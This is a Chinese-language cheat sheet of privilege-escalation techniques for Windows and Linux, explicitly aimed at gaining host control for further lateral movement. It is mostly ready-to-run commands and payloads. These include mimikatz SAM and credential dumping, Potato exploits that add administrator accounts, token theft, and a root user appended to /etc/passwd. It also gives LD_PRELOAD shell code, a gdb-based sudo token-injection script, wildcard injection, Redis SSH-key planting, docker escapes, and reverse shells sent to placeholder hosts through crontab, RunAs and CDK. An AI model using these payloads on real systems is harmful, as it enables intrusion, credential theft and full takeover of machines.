# *提权（windows提权，linux提权；此阶段的目的是为了获得主机权限，方便后续横向渗透。）

权限提升可以分为"水平权限提升(横向移动)"，"垂直权限提升"两种。

权限之所以可以获得，提升，离不开这三种方式：

1.低权限修改，高权限执行。

2.低权限用户也会输入/存储高权限凭据。

3.超越权限体系，在其上层捕获/修改凭据等信息。

## windows 提权（不安全的windows系统配置项，windows系统漏洞和第三方提权）



#### 不安全的windows系统配置项(不安全的服务，不安全的注册表项，不安全的应用程序，不安全的系统配置，不安全的令牌权限，令牌操纵，RunAs，绕过UAC)

##### 不安全的服务（弱权限的服务配置&服务文件&注册表，未引用的服务路径，DLL劫持）

###### 弱权限的服务配置&服务文件&注册表

winpeass : winpeasany.exe quiet notcolor servicesinfo 

powerUp : Invoke-PrivescAudit

powerUp : Get-service  | set-serviceBinaryPath 

matesploit : exploit/windows/local/service_permissions

###### 未引用的服务路径

matesploit : exploit/windows/local/unquoted_service_path

###### DLL劫持

##### 不安全的注册表项（注册表启动AutoRun，AlwaysInstallElevated）

###### 注册表启动AutoRun

winpeass : winpeasany.exe quiet notcolor applicationsinfo

icacls "" #查看权限

copy <原文件_path> <.bak>

copy  <原文件_path> /Y #强制替换

（需要等待管理员重启）

###### AlwaysInstallElevated

\#AlwaysInstallElevated

matesploit : exploit/windows/local/always_install_elevated

##### 不安全的应用程序

查看系统可能存在的可以利用的漏洞

post/windows/gather/enum_applications

##### 不安全的系统配置(环境变量劫持，可修改的计划任务，HiveNIghtmare，开机启动文件夹)

###### 环境变量劫持

echo %path%

powershell $env:path

\#当path优先级较高的目录可写，那么可以优先运行（同名系统命令）的恶意文件，当管理员使用系统命令时，恶意文件以较高权限运行

###### 可修改的计划任务

schtasks /query /fo list /v | find /v "\Microsoft"

schtasks /query /fo list /v /TN <可疑计划任务名称>

icacls "启动文件" #查看是否有写入权限

###### HiveNIghtmare

use post/windows/gather/credentials/windows_sam_hivenightmare

###### 开机启动文件夹

icacls "c:\users\<用户名>\appdata\roaming\microsoft\windows\start menu\programs\startup"

icacls "c:\programData\microsoft\windows\start menu\programs\startup"

copy payload.exe <启动文件夹>

##### 不安全的令牌权限（SeLimersonatePrivilege和SeAssignPrimaryTokenPrivilege，SeDebugPrivilege，SeTcbPrivilege，SeBackupPrivilege和SeRestorePrivilege，SeCreateTokenPrivilege，SeLoadDriverPrivilege，SeTakeOwnershipPrivilege）

whoami /priv

###### SeLimersonatePrivilege和SeAssignPrimaryTokenPrivilege

Rotten Potato： https://github.com/breenmachine/RottenPotatoNG

lonelypotato： https://github.com/decoder-it/lonelypotato

Juicy Potato： https://github.com/ohpe/juicy-potato



metasploit : search juicy potato



JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -c {F2E606B6-2631-43A8-9D99-2D5B86F82DE4}

###### SeDebugPrivilege

metasploit : ps

metasploit : migrate 



mimikatz : mimikatz.exe "privilege::debug" "token::elevate" "exit"

###### SeTcbPrivilege

mimikatz : mimikatz.exe "privilege::tcb" "token::elevate" "exit"

###### SeBackupPrivilege和SeRestorePrivilege

mimikatz : privilege::debug

mimikatz : privilege::backup

mimikatz : token::elevate

mimikatz : lsadump::sam



reg : reg save hklm\system system.hive

reg : reg save hklm\sam sam.hive

mimikatz : lsadump::sam /sam:sam.hive /system:system.hive | pwdump : pwdump.py system.hive sam.hive

###### SeCreateTokenPrivilege



###### SeLoadDriverPrivilege

metasploit : use exploit/windows/local/capcom_sys_exec

###### SeTakeOwnershipPrivilege



##### 令牌操纵（令牌冒用，令牌窃取）

cmdkey /list

###### 令牌冒用

incognito.exe

incognito.exe list_tokens -u #列出令牌

incognito.exe execute -c "<可用令牌>" cmd.exe



metasploit : load incognito

metasploit : getuid

metasploit : list_tokens -u

metasploit : impersonate_token "<令牌>"

metasploit : getuid

metasploit : rev2self #返回原本的token



invoke-TokenManipulation.ps1

powershell-import invoke-TokenManipulation.ps1

Invoke-TokenManipulation -enumerate #列出可用令牌

Invoke-TokenManipulation -CreateProcess "c:\xxx.shell" -Username "nt authority\system"

###### 令牌窃取

metasploit

steal_token <进程ID>

rev2self



invoke-TokenManipulation.ps1

powershell-import invoke-TokenManipulation.ps1

Invoke-TokenManipulation -enumerate #列出可用令牌

Invoke-TokenManipulation -CreateProcess "c:\xxx.shell" -ProcessID <进程ID>

##### RunAs（常规利用，RunasCs，Powershell，WMIC）

RunAs : RunAs.exe <用户名> <密码> 

\#RunAs.exe administrator qwe123!QZ cmd.exe -r xxx.xxx.xxx.xxx:xxx #反弹shell



$password=ConvertTo-SecureString "<密码>" -AsPlainText -Force ; $cred=New-Object System.Management.Automation.PSCredential("<用户名>", $password) ; $IP="<服务器ip>" [System.Diagnostics.Process]::Start("<要运行的程序>", $cred.Username, $cred.Password,$IP)

##### 绕过UAC（查看UAC状态，白名单程序绕过UAC，COM组件绕过UAC，常用工具）

metasploit : search bypassuac

##### windows系统漏洞和第三方提权(Hot Potato，Print Spooler和PrintNightmare，溢出漏洞，数据库提权)

###### Hot Potato

Hot Potato： https://github.com/foxglovesec/Potato

powershell版本Hot Potato： https://github.com/Kevin-Robertson/Tater



potato.exe -ip  -cmd "c:\\windows\\system32\\cmd.exe /k net localgroup administrators potato /add" -disable_exhaust true -disable_defender true -spoof_host WPAD

###### Print Spooler和PrintNightmare

impacket-rpcdump : impacket-rpcdump @<> | grep -E 'MS-RPRN|MS-PAR' #判断spooler服务是否开启

metasploit : search print spooler

metasploit : exploit/windows/dcerpc/cve_2021_1675_printnightmare



metasploit : post/multi/recon/local_exploit_suggester

###### 溢出漏洞

metasploit : post/windows/gather/enum_patches #发现补丁



metasploit : post/multi/recon/local_exploit_suggester



wes/windows_exploit_suggester : 

systeminfo > systeminfo.txt

pip install wesng

sudo ./wes.py --update

./wes.py systeminfo.txt



searchsploit : searchsploit windows local privilege escalation



winpeass : winpeass

###### 数据库提权

mssql : 

metasploit : auxiliary/scanner/mssql/smsql_ping #查找网络中安装了MSSQL数据库的服务器

nmap : nmap -sT -Pn -p1433 xxx.xxx.xxx.xxx/xx



UDF提权（root等高权限，）

文件写提权（sercurity_file_priv变量为空）

metasploit : use exploit/multi/mysql/mysql_udf_payload



mysql : 

metasploit : auxilitary/scanner/mysql/mysql_version #查找网络中安装了MySQL数据库的服务器

nmap -sT -Pn -p3306

##### 不安全的服务，注册表项，应用程序，系统配置

查找系统中的补丁

post/windows/gather/enum_patches



自动安装配置文件

post/windows/gather/enum_unattend



组策略偏好GPP

post/windows/gather/credentials/gpp



##### CVE

2025-33073  域提权漏洞

https://blog.csdn.net/qq_44159028/article/details/148738286

ms16-075  potato提权

ms17-010   永恒之蓝

cve-2021-1675  printnightmare

cve-2020-1337  printerdemon

## linux 提权（不安全的linux系统配置项，linux系统漏洞和第三方提权）

#### 不安全的linux系统配置项（不安全的用户组，不安全的读写权限，不安全的suid权限，不安全的sudo配置，不安全的定时任务，可被利用的通配符）

##### 不安全的用户组（disk用户组，adm用户组，shadow用户组，lxd用户组，docker用户组）

###### disk用户组

id #disk用户组

df

debugfs /dev/sda1

cat /etc/shadow

###### adm用户组

id #adm用户组 可查看敏感日志文件

ls -liah /var/log/syslog #4208690 -rw-r----- 1 root adm 827K  2月 2日 22:14 /var/log/syslog

cat /var/log/syslog

###### shadow用户组

id #shadow用户组 可直接查看shadow文件

ls -liah /etc/shadow #3671793 -rw-r----- 1 root shadow 2.2K  1月10日 21:51 /etc/shadow

cat /etc/shadow

###### lxd用户组



###### docker用户组



##### 不安全的读写权限（可写的/etc/passwd，可读的/etc/shadow，systemd配置不当）

###### 可写的/etc/passwd

ls -liah /etc/passwd #3673493 -rw-r--rw- 1 root root 4.1K  2月 2日 22:59 /etc/passwd 可写的/etc/passwd

passwd=`openssl passwd -6 123456` ; echo "hack:${passwd}:0:0::/root:/bin/bash" >> /etc/passwd

su hack #或者echo -e "123456\n" | su hack -c "whoami;cat /etc/shadow"

###### 可读的/etc/shadow

ls -liah /etc/shadow #3671793 -rw-r--r-- 1 root shadow 2.2K  1月10日 21:51 /etc/shadow 可读的/etc/shadow

cat /etc/shadow

###### systemd配置不当

ls -liah /lib/systemd/system/ | grep `whoami` #2105147 -rw-rw-r--  1 Qsa3 root  204  2月 3日 00:19 debug.service systemd配置不当

cat /lib/systemd/system/debug.service

\-------------------------------------------

[Unit]

Description=apache2 debugging

After=network.target

StartLimitIntervalSec=0

[Service]

Type=idle

Restart=always

RestartSec=1

User=root

ExecStart=/var/www/debug

[Install]

WantedBy=multi-user.target

\-------------------------------------------

echo '#!/bin/bash' > /tmp/pass.sh ; echo 'if ! grep -Fq "hack:$6$" /etc/passwd;then' >> /tmp/pass.sh ; echo 'passwd=`openssl passwd -6 123456` ; echo "hack:${passwd}:0:0::/root:/bin/bash" >> /etc/passwd' >> /tmp/pass.sh ; echo fi >> /tmp/pass.sh ; chmod +x /tmp/pass.sh

cat /tmp/pass.sh

\----------------

\#!/bin/bash

if ! grep -Fq "hack:$6$" /etc/passwd;then

passwd=`openssl passwd -6 123456` ; echo "hack:${passwd}:0:0::/root:/bin/bash" >> /etc/passwd

fi

\----------------

cat /lib/systemd/system/debug.service

\-------------------------------------------

[Unit]

Description=apache2 debugging

After=network.target

StartLimitIntervalSec=0

[Service]

Type=idle

Restart=always

RestartSec=1

User=root

ExecStart=/tmp/pass.sh

[Install]

WantedBy=multi-user.target

\-------------------------------------------

systemctl restart debug.service #重启或重启服务

##### 不安全的suid权限（suid配置不当，suid systemctl提权，$PATH变量劫持，so共享库注入，Capabilities机制）

###### suid配置不当

find / -perm -u=s -type f 2>/dev/null #查找配置了suid权限的文件

gtfobins.org #公开利用

###### suid systemctl提权

find / -perm -u=s -type f 2>/dev/null #systemctl

gtfobins.org #公开利用

###### $PATH变量劫持

find / -perm -u=s -type f 2>/dev/null #/usr/bin/run_ps $PATH变量劫持

ls -liah /usr/bin/run_ps #33574986 -rwsr-xr-x. 1 root root 8.4K Feb  2 09:30 /usr/bin/run_ps

/usr/bin/run_ps

\-------------------------------------------

   PID TTY          TIME CMD

  5546 pts/0    00:00:00 run_ps

  5547 pts/0    00:00:00 ps

\-------------------------------------------

\#这表明/usr/bin/run_ps调用了ps命令

echo '#!/bin/bash' > /tmp/ps ; echo '/bin/bash -p' >> /tmp/ps ; chmod +x /tmp/ps

export PATH=/tmp:$PATH

/usr/bin/run_ps #root

###### so共享库注入

ls -liah hack_me #33833813 -rwsr-xr-x. 1 root root 8.5K Feb  2 09:48 hack_me so共享库注入

./hack_me 

\------------------------------

hello

Cannot load library: /tmp/hackme.so: cannot open shared object file: No such file or directory

\------------------------------

编写一个/tmp/hackme.c

\-------------------------------------------

\#include

\#include

void _init(){

​        setresuid(0,0,0);

​        system("/bin/bash -p");

}

\-------------------------------------------

gcc -shared -fPIC -o /tmp/hackme.so /tmp/hackme.c -nostartfiles

./hack_me #root

###### Capabilities机制

getcap -r / 2>/dev/null #cap_setuid=eip

gtfobins.org #公开利用

##### 不安全的sudo配置（sudo权限分配不当，sudo脚本篡改和参数利用，sudo绕过路径执行，sudo LD_PRELOAD环境变量，sudo cacheing，sudo令牌注入，secure_path劫持）

###### sudo权限分配不当

sudo -l #(ALL : ALL) ALL / awk 等工具 sudo权限分配不当

gtfobins.org #公开利用

###### sudo脚本篡改和参数利用

sudo -l # (root) NOPASSWORD: /home/xxx.sh sudo脚本篡改和参数利用

echo "bash -p" >> /home/xxx.sh

###### sudo绕过路径执行

sudo -l # (root) NOPASSWORD: /bin/less /var/log/* sudo绕过路径执行

sudo less /var/log/../../etc/shadow

###### sudo LD_PRELOAD环境变量

sudo -l # (ALL) /usr/sbin/apache2         env_keep+=LD_PRELOAD

编写so.c文件导出为shell.so

\-------------------------------------------

\#include 

\#include 

\#include 

void _init() {

​    unsetenv("LD_PRELOAD");

​    setresuid(0,0,0);

​    system("/bin/bash -p");

}

\-------------------------------------------

gcc -shared -fPIC -o shell.so so.c -nostartfiles

sudo LD_PRELOAD=/tmp/shell.so apache2

###### sudo cacheing

cat /etc/sudoers

defaults timestamp_timeout=-1 #这个参数用于设置在使用sudo命令的超时时间，为-1则当前终端永远不需要输入密码即可使用sudo

defaults !tty_tickets # 这个参数用于启用或者禁用tty（teletype，终端）票据功能，如果启用了，则用户在每个终端上执行sudo命令都需要输入密码，反之，只需要输入一次密码，在其他终端上不需要再输入

defaults !authenticate # 这个参数用于配置使用sudo命令时是否需要输入密码，如果启用，则需要，如果不启用，则代表不需要输入密码

###### sudo令牌注入

cat /proc/sys/kernel/yama/ptrace_scope #0 sudo令牌注入

编写shell.sh脚本

\-------------------------------------------

\#!/bin/sh# create an invalid sudo entry for the current shell

echo | sudo -S >/dev/null 2>&1

echo "Current process : $$"

cp activate_sudo_token /tmp/

chmod +x activate_sudo_token

\# timestamp_dir=$(sudo --version | grep "timestamp dir" | grep -o '/.*')

\# inject all shell belonging to the current user, our shell one :p

for pid in $(pgrep '^(ash|ksh|csh|dash|bash|zsh|tcsh|sh)$' -u "$(id -u)" | grep -v "^$$\$")

do

​        echo "Injecting process $pid -> "$(cat "/proc/$pid/comm")

​        echo 'call system("echo | sudo -S /tmp/activate_sudo_token /var/lib/sudo/ts/* >/dev/null 2>&1")' \

​                | gdb -q -n -p "$pid" >/dev/null 2>&1

done

\-------------------------------------------

sudo ls #另起一个终端sudo执行一下命令并输入密码 (利用条件之一，显示情况为sudo已经输入密码并留存在进程中)

chmod 777 shell.sh

./shell.sh

sudo -i #root

###### secure_path劫持

sudo -l #secure_path=/tmp\:.... (root)NOPASSWORD: /bin/bash ps  secure_path劫持

echo "bash -p" >> /tmp/ps

##### 不安全的定时任务（crontab配置可写，crontab调用文件覆写，cron环境变量）

###### crontab配置可写

ls -liah /etc/crontab #crontab文件可写

 \* * * * * root /bin/bash -c "/bin/bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/xxx 0>&1"

###### crontab调用文件覆写

ls -liah /etc/crontab #当crontab以root权限运行某个脚本，恰好这个脚本可以修改，那么这个脚本可以用来修改提权

###### cron环境变量

cat /etc/crontab #SHELL=/bin/sh  PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

\#如果shell和path的路径存在相对路径等情况，可以通过这种方式提权

##### 可被利用的通配符（chown劫持文件所有者，tar通配符，rsync通配符注入）

###### chown劫持文件所有者

ls -liah root.pass # -r--------- root root root.pass

cat /etc/crontab # * * * * * cd /tmp/pass && /bin/chown -R root:root *.pass

echo > a.pass && echo >--reference=a.pass

通过劫持chown和通配符实现root.pass所有者修改

###### tar通配符

能以root 权限运行tar命令并压缩打包*.txt等文件

echo -e '#!/bin/bash' > 1.sh ; echo 'passwd=`openssl passwd -6 123456` ; echo "hack:${passwd}:0:0::/root:/bin/bash" >> /etc/passwd' >> 1.sh ; chmod +x 1.sh

echo '' > "--checkpoint-action=exec=sh 1.sh"

echo '' > --checkpoint=1

\#以root权限运行获得root

###### rsync通配符注入

echo -e '#!/bin/bash' > 1.sh ; echo 'passwd=`openssl passwd -6 123456` ; echo "hack:${passwd}:0:0::/root:/bin/bash" >> /etc/passwd' >> 1.sh ; chmod +x 1.sh

echo '' > '-e sh 1.sh'

以root权限运行这个命令，rsync -a * test:srv/ 就会导致提权

##### linux系统漏洞和第三方提权（内核漏洞，密码破解，不安全的第三方应用，docker逃逸）

###### 内核漏洞

searchsploit #内核漏洞提权

searchsploit -m xxxxx.xx



metasploit : search suggester : local_exploit_suggester



peass : linpeas.sh

###### 密码破解

metsploit : search scanner login ssh / search scanner login mysql / search scanner login tomcat



hydra #密码破解

###### 不安全的第三方应用

tomcat manager

metsploit : search tomcat mgr upload



redis 未授权访问1 ： 0.0.0.0:6379 2 : redis无密码或弱密码

ssh-keygen -t rsa

redis-cli -h xxx.xxx.xxx.xxx

config get dir

config get dbfilename

config set dir /root/.ssh/

config set dbfilename authorized_keys

set heresec "\n\n\n ssh_rsa AAAx........ \n\n\n"

save



ssh -i id_rsa root@xxx.xxx.xxx.xxx

###### docker逃逸

容器自身漏洞，配置不当（目录挂载，capabilities，特权模式），宿主机内核漏洞

github.com/cdk-team/CDK



cat /proc/net/unix | grep 'containerd-shim'

./cdk run shim-pwn reverse xxx.xxx.xxx.xxx 4444



特权模式，当docker容器运行在特权模式下，可挂载目录实现逃逸



mkdir /tmp/hosts

fdisk -l | grep sda

mount /dev/sda1 /tmp/hosts

cd /tmp/hosts

chroot ./ bash



capabilities



capsh --print